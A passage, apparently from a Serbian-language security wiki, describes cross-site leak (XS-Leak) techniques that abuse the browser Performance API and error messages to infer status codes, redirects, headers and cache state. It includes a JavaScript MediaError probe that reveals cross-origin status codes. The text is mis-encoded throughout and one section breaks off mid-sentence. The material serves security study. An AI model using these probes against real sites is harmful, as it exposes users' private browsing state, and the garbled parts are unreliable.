Ova obilje podataka moÅ¾e se dobiti putem metoda poput [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) ili [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName), pruÅ¾ajuÄ‡i sveobuhvatan pregled informacija vezanih za performanse. Osim toga, API omoguÄ‡ava merenje vremena izvrÅ¡avanja tako Å¡to raÄuna razliku izmeÄ‘u vremenskih oznaka dobijenih iz [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now). MeÄ‘utim, treba napomenuti da za odreÄ‘ene operacije u pregledaÄima poput Chrome-a, preciznost `performance.now()` moÅ¾e biti ograniÄena na milisekunde, Å¡to moÅ¾e uticati na granularnost merenja vremena.

Pored merenja vremena, Performance API se moÅ¾e iskoristiti za sigurnosne uvide. Na primer, prisustvo ili odsustvo stranica u objektu `performance` u Chrome-u moÅ¾e ukazivati na primenu `X-Frame-Options`. Konkretno, ako se stranica blokira od prikazivanja u okviru zbog `X-Frame-Options`, neÄ‡e biti zabeleÅ¾ena u objektu `performance`, pruÅ¾ajuÄ‡i suptilan trag o politikama okvira stranice.

### Curenje greÅ¡ke

* **Metode ukljuÄivanja**: Okviri, HTML elementi
* **Detektoviva razlika**: Statusni kod
* **ViÅ¡e informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Rezime**: Zahtevi koji rezultiraju greÅ¡kama neÄ‡e kreirati unos o vremenu resursa.
* **Primer koda**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

MoguÄ‡e je **razlikovati HTTP statusne kodove odgovora** jer zahtevi koji dovode do **greÅ¡ke ne stvaraju unos o performansama**.

### GreÅ¡ka ponovnog uÄitavanja stila

* **Metode ukljuÄivanja**: HTML elementi
* **Detektoviva razlika**: Statusni kod
* **ViÅ¡e informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Rezime**: Zbog greÅ¡ke u pregledaÄu, zahtevi koji rezultiraju greÅ¡kama se uÄitavaju dva puta.
* **Primer koda**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

U prethodnoj tehnici takoÄ‘e su identifikovana dva sluÄaja u kojima greÅ¡ke u GC-u dovode do **dvostrukog uÄitavanja resursa koji ne uspeju da se uÄitaju**. To Ä‡e rezultirati viÅ¡estrukim unosima u Performance API-ju i moÅ¾e se detektovati.

### GreÅ¡ka spajanja zahteva

* **Metode ukljuÄivanja**: HTML elementi
* **Detektoviva razlika**: Statusni kod
* **ViÅ¡e informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Rezime**: Zahtevi koji rezultiraju greÅ¡kom ne mogu se spojiti.
* **Primer koda**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

Tehnika je pronaÄ‘ena u tabeli u pomenutom radu, ali nije pronaÄ‘en opis tehnike. MeÄ‘utim, izvorni kod koji proverava ovu tehniku moÅ¾ete pronaÄ‡i na [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

### Curenje prazne stranice

* **Metode ukljuÄivanja**: Okviri
* **Detektoviva razlika**: SadrÅ¾aj stranice
* **ViÅ¡e informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Rezime**: Prazni odgovori ne stvaraju unose o vremenu resursa.
* **Primer koda**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

NapadaÄ moÅ¾e da detektuje da li je zahtev rezultirao praznim telom HTTP odgovora jer **prazne stranice ne stvaraju unos o performansama u nekim pregledaÄima**.

### Curenje XSS-Auditora

* **Metode ukljuÄivanja**: Okviri
* **Detektoviva razlika**: SadrÅ¾aj stranice
* **ViÅ¡e informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Rezime**: KoriÅ¡Ä‡enjem XSS Auditora u Security Assertions, napadaÄi mogu detektovati odreÄ‘ene elemente veb stranica posmatrajuÄ‡i promene u odgovorima kada izraÄ‘eni payloadi pokrenu mehanizam filtriranja auditora.
* **Primer koda**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

U Security Assertions (SA), XSS Auditor, koji je prvobitno namenjen za spreÄavanje XSS napada, paradoksalno moÅ¾e biti iskoriÅ¡Ä‡en za curenje osetljivih informacija. Iako je ova ugraÄ‘ena funkcionalnost uklonjena iz Google Chrome-a (GC), i dalje je prisutna u SA. Braun i Heiderich su 2013. godine pokazali da XSS Auditor sluÄajno moÅ¾e blokirati legitimne skripte, Å¡to dovodi do laÅ¾nih pozitiva. Na osnovu toga, istraÅ¾ivaÄi su razvili tehnike za izvlaÄenje informacija i detektovanje odreÄ‘enog sadrÅ¾aja na stranicama preko granica izvora, koncept poznat kao XS-Leaks, koji je inicijalno prijavio Terada, a razradio Heyes u blog postu. Iako su ove tehnike bile specifiÄne za XSS Auditor u GC-u, otkriveno je da u SA, stranice blokirane od strane XSS Auditora ne generiÅ¡u unose u Performance API-ju, otkrivajuÄ‡i naÄin putem kojeg osetljive informacije i dalje mogu biti curenje.

### Curenje X-Frame

* **Metode ukljuÄivanja**: Okviri
* **Detektoviva razlika**: Zaglavlje
* **ViÅ¡e informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
* **Rezime**: Resurs sa zaglavljem X-Frame-Options ne stvara unos o vremenu resursa.
* **Primer koda**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

Ako se stranica **
### PoÄetak curenja preusmeravanja

* **Metode ukljuÄivanja**: Okviri
* **Detektoviva razlika**: Preusmeravanje
* **ViÅ¡e informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Rezime**: Unos vremena resursa otkriva vreme poÄetka preusmeravanja.
* **Primer koda**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

PronaÅ¡li smo jedan primer XS-Leak koji zloupotrebljava ponaÅ¡anje nekih pregledaÄa koji beleÅ¾e previÅ¡e informacija za zahteve preko granica izvora. Standard definiÅ¡e podskup atributa koji bi trebalo postaviti na nulu za resurse preko granica izvora. MeÄ‘utim, u **SA** je moguÄ‡e otkriti da li je korisnik **preusmeren** od strane ciljne stranice, upitivanjem **Performance API-ja** i proverom podataka o vremenu **redirectStart**.

### Curenje trajanja preusmeravanja

* **Metode ukljuÄivanja**: Fetch API
* **Detektoviva razlika**: Preusmeravanje
* **ViÅ¡e informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Rezime**: Trajanje unosa vremena je negativno kada se desi preusmeravanje.
* **Primer koda**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

U GC-u, **trajanje** za zahteve koji rezultiraju u **preusmeravanju** je **negativno** i moÅ¾e se **razlikovati** od zahteva koji ne rezultiraju u preusmeravanju.

### CORP curenje

* **Metode ukljuÄivanja**: Okviri
* **Detektoviva razlika**: Zaglavlje
* **ViÅ¡e informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Rezime**: Resursi zaÅ¡tiÄ‡eni sa CORP-om ne stvaraju unose vremena resursa.
* **Primer koda**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

U nekim sluÄajevima, **nextHopProtocol unos** moÅ¾e se koristiti kao tehnika curenja. U GC-u, kada je postavljeno **CORP zaglavlje**, nextHopProtocol Ä‡e biti **prazan**. Napomena: SA neÄ‡e uopÅ¡te kreirati unos performansi za resurse sa omoguÄ‡enim CORP-om.

### Servisni radnik

* **Metode ukljuÄivanja**: Okviri
* **Detektoviva razlika**: Upotreba API-ja
* **ViÅ¡e informacija**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **Rezime**: Otkrivanje da li je servisni radnik registrovan za odreÄ‘eni izvor.
* **Primer koda**:

Servisni radnici su konteksti skripti koji se pokreÄ‡u na izvoru. Oni rade u pozadini veb stranice i mogu presretati, menjati i **keÅ¡irati resurse** kako bi kreirali veb aplikacije van mreÅ¾e.\
Ako se **resurs keÅ¡ira** od strane **servisnog radnika** i pristupa mu se putem **iframe-a**, resurs Ä‡e biti **uÄitan iz keÅ¡a servisnog radnika**.\
Da bi se otkrilo da li je resurs **uÄitan iz keÅ¡a servisnog radnika**, moÅ¾e se koristiti **Performance API**.\
Ovo takoÄ‘e moÅ¾e biti uraÄ‘eno pomoÄ‡u napada na vremenskoj osnovi (proverite rad za viÅ¡e informacija).

### KeÅ¡

* **Metode ukljuÄivanja**: Fetch API
* **Detektoviva razlika**: Vremensko osnovanje
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **Rezime**: MoguÄ‡e je proveriti da li je resurs smeÅ¡ten u keÅ¡u.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

KoriÅ¡Ä‡enjem [Performance API-ja](xs-search.md#performance-api) moguÄ‡e je proveriti da li je resurs keÅ¡iran.

### Trajanje mreÅ¾e

* **Metode ukljuÄivanja**: Fetch API
* **Detektoviva razlika**: SadrÅ¾aj stranice
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **Rezime**: MoguÄ‡e je dobiti trajanje mreÅ¾e zahteva iz `performance` API-ja.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Tehnika poruka o greÅ¡kama

### GreÅ¡ka medija

* **Metode ukljuÄivanja**: HTML elementi (Video, Audio)
* **Detektoviva razlika**: Kod statusa
* **ViÅ¡e informacija**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **Rezime**: U Firefox-u je moguÄ‡e taÄno otkriti statusni kod zahteva preko granica izvora.
* **Primer koda**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
`MediaError` Ğ¸Ğ½Ñ‚ĞµÑ€Ñ„ĞµÑ˜ÑĞ¾Ğ²Ğ° ÑĞ²Ğ¾Ñ˜ÑÑ‚Ğ²Ğ¾ `message` Ñ˜ĞµĞ´Ğ¸Ğ½ÑÑ‚Ğ²ĞµĞ½Ğ¾ Ğ¸Ğ´ĞµĞ½Ñ‚Ğ¸Ñ„Ğ¸ĞºÑƒÑ˜Ğµ Ñ€ĞµÑÑƒÑ€ÑĞµ ĞºĞ¾Ñ˜Ğ¸ ÑƒÑĞ¿ĞµÑˆĞ½Ğ¾ ÑƒÑ‡Ğ¸Ñ‚Ğ°Ğ²Ğ°Ñ˜Ñƒ ÑĞ° Ğ¿Ğ¾ÑĞµĞ±Ğ½Ğ¸Ğ¼ Ğ½Ğ¸Ğ·Ğ¾Ğ¼ ĞºĞ°Ñ€Ğ°ĞºÑ‚ĞµÑ€Ğ°. ĞĞ°Ğ¿Ğ°Ğ´Ğ°Ñ‡ Ğ¼Ğ¾Ğ¶Ğµ Ğ¸ÑĞºĞ¾Ñ€Ğ¸ÑÑ‚Ğ¸Ñ‚Ğ¸ Ğ¾Ğ²Ñƒ Ñ„ÑƒĞ½ĞºÑ†Ğ¸Ğ¾Ğ½Ğ°Ğ»Ğ½Ğ¾ÑÑ‚ Ğ¿Ñ€Ğ°Ñ›ĞµÑšĞµĞ¼ ÑĞ°Ğ´Ñ€Ğ¶Ğ°Ñ˜Ğ° Ğ¿Ğ¾Ñ€ÑƒĞºĞµ Ğ¸ Ğ½Ğ° Ñ‚Ğ°Ñ˜ Ğ½Ğ°Ñ‡Ğ¸Ğ½ Ğ·Ğ°ĞºÑ™ÑƒÑ‡Ğ¸Ñ‚Ğ¸ ÑÑ‚Ğ°Ñ‚ÑƒÑ Ğ¾Ğ´Ğ³Ğ¾Ğ²Ğ¾Ñ€Ğ° Ğ½Ğ° Ñ€ĞµÑÑƒÑ€Ñ Ğ¸Ğ· Ñ€Ğ°Ğ·Ğ»Ğ¸Ñ‡Ğ¸Ñ‚Ğ¸Ñ… Ğ¸Ğ·Ğ²Ğ¾Ñ€Ğ°.

### CORS Ğ“Ñ€ĞµÑˆĞºĞ°

* **ĞœĞµÑ‚Ğ¾Ğ´Ğ¸ ÑƒĞºÑ™ÑƒÑ‡Ğ¸Ğ²Ğ°ÑšĞ°**: Fetch API
* **Ğ”ĞµÑ‚ĞµĞºÑ‚Ğ°Ğ±Ğ¸Ğ»Ğ½Ğ° Ñ€Ğ°Ğ·Ğ»Ğ¸ĞºĞ°**: Ğ—Ğ°Ğ³Ğ»Ğ°Ğ²Ñ™Ğµ
* **Ğ’Ğ¸ÑˆĞµ Ğ¸Ğ½Ñ„Ğ¾Ñ€Ğ¼Ğ°Ñ†Ğ¸Ñ˜Ğ°**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Ğ ĞµĞ·Ğ¸Ğ¼Ğµ**: Ğ£ Ğ±ĞµĞ·Ğ±ĞµĞ´Ğ½Ğ¾ÑĞ½Ğ¸Ğ¼ Ñ‚Ğ²Ñ€Ğ´ÑšĞ°Ğ¼Ğ° (SA), CORS Ğ³Ñ€ĞµÑˆĞºĞµ Ğ½ĞµĞ½Ğ°Ğ¼ĞµÑ€Ğ½Ğ¾ Ğ¾Ñ‚ĞºÑ€Ğ¸Ğ²Ğ°Ñ˜Ñƒ Ğ¿ÑƒĞ½Ñƒ URL Ğ°Ğ´Ñ€ĞµÑÑƒ Ğ¿Ñ€ĞµÑƒÑĞ¼ĞµÑ€ĞµĞ½Ğ¸Ñ… Ğ·Ğ°Ñ…Ñ‚ĞµĞ²Ğ°.
* **ĞŸÑ€Ğ¸Ğ¼ĞµÑ€ ĞºĞ¾Ğ´Ğ°**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

ĞĞ²Ğ° Ñ‚ĞµÑ…Ğ½Ğ¸ĞºĞ° Ğ¾Ğ¼Ğ¾Ğ³ÑƒÑ›Ğ°Ğ²Ğ° Ğ½Ğ°Ğ¿Ğ°Ğ´Ğ°Ñ‡Ñƒ Ğ´Ğ° **Ğ¸Ğ·Ğ²ÑƒÑ‡Ğµ Ğ¾Ğ´Ñ€ĞµĞ´Ğ¸ÑˆÑ‚Ğµ Ğ¿Ñ€ĞµÑƒÑĞ¼ĞµÑ€ĞµĞ½Ğ¾Ğ³ ÑĞ°Ñ˜Ñ‚Ğ° ÑĞ° Ñ€Ğ°Ğ·Ğ»Ğ¸Ñ‡Ğ¸Ñ‚Ğ¾Ğ³ Ğ¿Ğ¾Ñ€ĞµĞºĞ»Ğ°** Ğ¸ÑĞºĞ¾Ñ€Ğ¸ÑˆÑ›Ğ°Ğ²Ğ°Ñ˜ÑƒÑ›Ğ¸ Ğ½Ğ°Ñ‡Ğ¸Ğ½ Ğ½Ğ° ĞºĞ¾Ñ˜Ğ¸ Ğ¿Ñ€ĞµĞ³Ğ»ĞµĞ´Ğ°Ñ‡Ğ¸ Ğ±Ğ°Ğ·Ğ¸Ñ€Ğ°Ğ½Ğ¸ Ğ½Ğ° Webkit-Ñƒ Ğ¾Ğ±Ñ€Ğ°Ñ’ÑƒÑ˜Ñƒ CORS Ğ·Ğ°Ñ…Ñ‚ĞµĞ²Ğµ. ĞšĞ¾Ğ½ĞºÑ€ĞµÑ‚Ğ½Ğ¾, ĞºĞ°Ğ´Ğ° ÑĞµ **CORS-Ğ¾Ğ¼Ğ¾Ğ³ÑƒÑ›ĞµĞ½Ğ¸ Ğ·Ğ°Ñ…Ñ‚ĞµĞ²** Ğ¿Ğ¾ÑˆĞ°Ñ™Ğµ ĞºĞ° Ñ†Ğ¸Ñ™Ğ°Ğ½Ğ¾Ğ¼ ÑĞ°Ñ˜Ñ‚Ñƒ ĞºĞ¾Ñ˜Ğ¸ Ğ¸Ğ·Ğ´Ğ°Ñ˜Ğµ Ğ¿Ñ€ĞµÑƒÑĞ¼ĞµÑ€ĞµÑšĞµ Ğ½Ğ° Ğ¾ÑĞ½Ğ¾Ğ²Ñƒ ÑÑ‚Ğ°ÑšĞ° ĞºĞ¾Ñ€Ğ¸ÑĞ½Ğ¸ĞºĞ° Ğ¸ Ğ¿Ñ€ĞµĞ³Ğ»ĞµĞ´Ğ°Ñ‡ Ğ·Ğ°Ñ‚Ğ¸Ğ¼ Ğ¾Ğ´Ğ±Ğ¸Ñ˜Ğµ Ğ·Ğ°Ñ…Ñ‚ĞµĞ², **Ğ¿Ğ¾Ñ€ÑƒĞºĞ° Ğ¾ Ğ³Ñ€ĞµÑˆÑ†Ğ¸ Ğ¾Ñ‚ĞºÑ€Ğ¸Ğ²Ğ° Ğ¿ÑƒĞ½Ñƒ URL Ğ°Ğ´Ñ€ĞµÑÑƒ Ğ¾Ğ´Ñ€ĞµĞ´Ğ¸ÑˆÑ‚Ğ° Ğ¿Ñ€ĞµÑƒÑĞ¼ĞµÑ€ĞµÑšĞ°**. ĞĞ²Ğ° ÑƒĞ³Ñ€Ğ¾Ğ¶ĞµĞ½Ğ¾ÑÑ‚ Ğ½Ğµ ÑĞ°Ğ¼Ğ¾ Ğ´Ğ° Ğ¾Ñ‚ĞºÑ€Ğ¸Ğ²Ğ° Ñ‡Ğ¸ÑšĞµĞ½Ğ¸Ñ†Ñƒ Ğ¾ Ğ¿Ñ€ĞµÑƒÑĞ¼ĞµÑ€ĞµÑšÑƒ, Ğ²ĞµÑ› Ñ‚Ğ°ĞºĞ¾Ñ’Ğµ Ğ¾Ñ‚ĞºÑ€Ğ¸Ğ²Ğ° Ğ¸ ĞºÑ€Ğ°Ñ˜ÑšÑƒ Ñ‚Ğ°Ñ‡ĞºÑƒ Ğ¿Ñ€ĞµÑƒÑĞ¼ĞµÑ€ĞµÑšĞ° Ğ¸ Ğ±Ğ¸Ğ»Ğ¾ **Ğ¾ÑĞµÑ‚Ñ™Ğ¸Ğ²Ğµ Ğ¿Ğ°Ñ€Ğ°Ğ¼ĞµÑ‚Ñ€Ğµ ÑƒĞ¿Ğ¸Ñ‚Ğ°** ĞºĞ¾Ñ˜Ğµ Ğ¼Ğ¾Ğ¶Ğµ ÑĞ°Ğ´Ñ€Ğ¶Ğ°Ñ‚Ğ¸.

### SRI Ğ“Ñ€ĞµÑˆĞºĞ°

* **ĞœĞµÑ‚Ğ¾Ğ´Ğ¸ ÑƒĞºÑ™ÑƒÑ‡Ğ¸Ğ²Ğ°ÑšĞ°**: Fetch API
* **Ğ”ĞµÑ‚ĞµĞºÑ‚Ğ°Ğ±Ğ¸Ğ»Ğ½Ğ° Ñ€Ğ°Ğ·Ğ»Ğ¸ĞºĞ°**: Ğ—Ğ°Ğ³Ğ»Ğ°Ğ²Ñ™Ğµ
* **Ğ’Ğ¸ÑˆĞµ Ğ¸Ğ½Ñ„Ğ¾Ñ€Ğ¼Ğ°Ñ†Ğ¸Ñ˜Ğ°**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Ğ ĞµĞ·Ğ¸Ğ¼Ğµ**: Ğ£ Ğ±ĞµĞ·Ğ±ĞµĞ´Ğ½Ğ¾ÑĞ½Ğ¸Ğ¼ Ñ‚Ğ²Ñ€Ğ´ÑšĞ°Ğ¼Ğ° (SA), CORS Ğ³Ñ€ĞµÑˆĞºĞµ Ğ½ĞµĞ½Ğ°Ğ¼ĞµÑ€Ğ½Ğ¾ Ğ¾Ñ‚ĞºÑ€Ğ¸Ğ²Ğ°Ñ˜Ñƒ Ğ¿ÑƒĞ½Ñƒ URL Ğ°Ğ´Ñ€ĞµÑÑƒ Ğ¿Ñ€ĞµÑƒÑĞ¼ĞµÑ€ĞµĞ½Ğ¸Ñ… Ğ·Ğ°Ñ…Ñ‚ĞµĞ²Ğ°.
* **ĞŸÑ€Ğ¸Ğ¼ĞµÑ€ ĞºĞ¾Ğ´Ğ°**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

ĞĞ°Ğ¿Ğ°Ğ´Ğ°Ñ‡ Ğ¼Ğ¾Ğ¶Ğµ Ğ¸ÑĞºĞ¾Ñ€Ğ¸ÑÑ‚Ğ¸Ñ‚Ğ¸ **Ğ¾Ğ¿ÑˆĞ¸Ñ€Ğ½Ğµ Ğ¿Ğ¾Ñ€ÑƒĞºĞµ Ğ¾ Ğ³Ñ€ĞµÑˆÑ†Ğ¸** Ğ´Ğ° Ğ±Ğ¸ Ğ·Ğ°ĞºÑ™ÑƒÑ‡Ğ¸Ğ¾ Ğ²ĞµĞ»Ğ¸Ñ‡Ğ¸Ğ½Ñƒ Ğ¿Ñ€ĞµÑƒÑĞ¼ĞµÑ€ĞµĞ½Ğ¸Ñ… Ğ¾Ğ´Ğ³Ğ¾Ğ²Ğ¾Ñ€Ğ° ÑĞ° Ñ€Ğ°Ğ·Ğ»Ğ¸Ñ‡Ğ¸Ñ‚Ğ¸Ñ… Ğ¸Ğ·Ğ²Ğ¾Ñ€Ğ°. ĞĞ²Ğ¾ Ñ˜Ğµ Ğ¼Ğ¾Ğ³ÑƒÑ›Ğµ Ğ·Ğ±Ğ¾Ğ³ Ğ¼ĞµÑ…Ğ°Ğ½Ğ¸Ğ·Ğ¼Ğ° Subresource Integrity (SRI), ĞºĞ¾Ñ˜Ğ¸ ĞºĞ¾Ñ€Ğ¸ÑÑ‚Ğ¸ integrity Ğ°Ñ‚Ñ€Ğ¸Ğ±ÑƒÑ‚ Ğ·Ğ° Ğ¿Ñ€Ğ¾Ğ²ĞµÑ€Ñƒ Ğ´Ğ° Ğ»Ğ¸ ÑĞµ Ñ€ĞµÑÑƒÑ€ÑĞ¸ ĞºĞ¾Ñ˜Ğ¸ ÑĞµ ÑƒÑ‡Ğ¸Ñ‚Ğ°Ğ²Ğ°Ñ˜Ñƒ, Ñ‡ĞµÑÑ‚Ğ¾ ÑĞ° CDN-Ğ¾Ğ²Ğ°, Ğ½Ğ¸ÑÑƒ Ğ¸Ğ·Ğ¼ĞµÑšĞµĞ½Ğ¸. Ğ”Ğ° Ğ±Ğ¸ SRI Ñ€Ğ°Ğ´Ğ¸Ğ¾ Ğ½Ğ° Ñ€ĞµÑÑƒÑ€ÑĞ¸Ğ¼Ğ° ÑĞ° Ñ€Ğ°Ğ·Ğ»Ğ¸Ñ‡Ğ¸Ñ‚Ğ¾Ğ³ Ğ¿Ğ¾Ñ€ĞµĞºĞ»Ğ°, Ğ¾Ğ½Ğ¸ Ğ¼Ğ¾Ñ€Ğ°Ñ˜Ñƒ Ğ±Ğ¸Ñ‚Ğ¸ **CORS-Ğ¾Ğ¼Ğ¾Ğ³ÑƒÑ›ĞµĞ½Ğ¸**; Ñƒ ÑÑƒĞ¿Ñ€Ğ¾Ñ‚Ğ½Ğ¾Ğ¼, Ğ¾Ğ½Ğ¸ Ğ½Ğ¸ÑÑƒ Ğ¿Ğ¾Ğ´Ğ»Ğ¾Ğ¶Ğ½Ğ¸ Ğ¿Ñ€Ğ¾Ğ²ĞµÑ€Ğ¸ Ğ¸Ğ½Ñ‚ĞµĞ³Ñ€Ğ¸Ñ‚ĞµÑ‚Ğ°. Ğ£ Ğ±ĞµĞ·Ğ±ĞµĞ´Ğ½Ğ¾ÑĞ½Ğ¸Ğ¼ Ñ‚Ğ²Ñ€Ğ´ÑšĞ°Ğ¼Ğ° (SA), ĞºĞ°Ğ¾ Ğ¸ Ñƒ ÑĞ»ÑƒÑ‡Ğ°Ñ˜Ñƒ CORS Ğ³Ñ€ĞµÑˆĞºĞµ XS-Leak, Ğ¿Ğ¾Ñ€ÑƒĞºĞ° Ğ¾ Ğ³Ñ€ĞµÑˆÑ†Ğ¸ Ğ¼Ğ¾Ğ¶Ğµ Ğ±Ğ¸Ñ‚Ğ¸ Ğ·Ğ°Ğ±ĞµĞ»ĞµĞ¶ĞµĞ½Ğ° Ğ½Ğ°ĞºĞ¾Ğ½ ÑˆÑ‚Ğ¾ Ğ·Ğ°Ñ…Ñ‚ĞµĞ² Ğ·Ğ° ÑƒÑ‡Ğ¸Ñ‚Ğ°Ğ²Ğ°ÑšĞµ ÑĞ° integrity Ğ°Ñ‚Ñ€Ğ¸Ğ±ÑƒÑ‚Ğ¾Ğ¼ Ğ½Ğµ ÑƒÑĞ¿Ğµ. ĞĞ°Ğ¿Ğ°Ğ´Ğ°Ñ‡Ğ¸ Ğ¼Ğ¾Ğ³Ñƒ Ğ½Ğ°Ğ¼ĞµÑ€Ğ½Ğ¾ **Ğ¸Ğ·Ğ°Ğ·Ğ²Ğ°Ñ‚Ğ¸ Ğ¾Ğ²Ñƒ Ğ³Ñ€ĞµÑˆĞºÑƒ** Ğ´Ğ¾Ğ´ĞµĞ»Ğ¾Ğ¼ **Ğ½ĞµĞ¿Ñ€Ğ°Ğ²Ğ¸Ğ»Ğ½Ğµ Ñ…ĞµÑˆ Ğ²Ñ€ĞµĞ´Ğ½Ğ¾ÑÑ‚Ğ¸** integrity Ğ°Ñ‚Ñ€Ğ¸Ğ±ÑƒÑ‚Ñƒ Ğ±Ğ¸Ğ»Ğ¾ ĞºĞ¾Ğ³ Ğ·Ğ°Ñ…Ñ‚ĞµĞ²Ğ°. Ğ£ SA, Ñ€ĞµĞ·ÑƒĞ»Ñ‚ÑƒÑ˜ÑƒÑ›Ğ° Ğ¿Ğ¾Ñ€ÑƒĞºĞ° Ğ¾ Ğ³Ñ€ĞµÑˆÑ†Ğ¸ Ğ½ĞµĞ½Ğ°Ğ¼ĞµÑ€Ğ½Ğ¾ Ğ¾Ñ‚ĞºÑ€Ğ¸Ğ²Ğ° Ğ´ÑƒĞ¶Ğ¸Ğ½Ñƒ ÑĞ°Ğ´Ñ€Ğ¶Ğ°Ñ˜Ğ° Ğ·Ğ°Ñ…Ñ‚ĞµĞ²Ğ°Ğ½Ğ¾Ğ³ Ñ€ĞµÑÑƒÑ€ÑĞ°. ĞĞ²Ğ° Ğ¸Ğ½Ñ„Ğ¾Ñ€Ğ¼Ğ°Ñ†Ğ¸Ñ˜ÑĞºĞ° Ğ¿Ñ€Ğ¾Ğ¿ÑƒÑÑ‚Ğ°ÑšĞ° Ğ¾Ğ¼Ğ¾Ğ³ÑƒÑ›Ğ°Ğ²Ğ°Ñ˜Ñƒ Ğ½Ğ°Ğ¿Ğ°Ğ´Ğ°Ñ‡Ñƒ Ğ´Ğ° Ğ¿Ñ€Ğ¸Ğ¼ĞµÑ‚Ğ¸ Ğ²Ğ°Ñ€Ğ¸Ñ˜Ğ°Ñ†Ğ¸Ñ˜Ğµ Ñƒ Ğ²ĞµĞ»Ğ¸Ñ‡Ğ¸Ğ½Ğ¸ Ğ¾Ğ´Ğ³Ğ¾Ğ²Ğ¾Ñ€Ğ°, Ğ¾Ñ‚Ğ²Ğ°Ñ€Ğ°Ñ˜ÑƒÑ›Ğ¸ Ğ¿ÑƒÑ‚ Ğ·Ğ° Ğ½Ğ°Ğ¿Ñ€ĞµĞ´Ğ½Ğµ XS-Leak Ğ½Ğ°Ğ¿Ğ°Ğ´Ğµ.

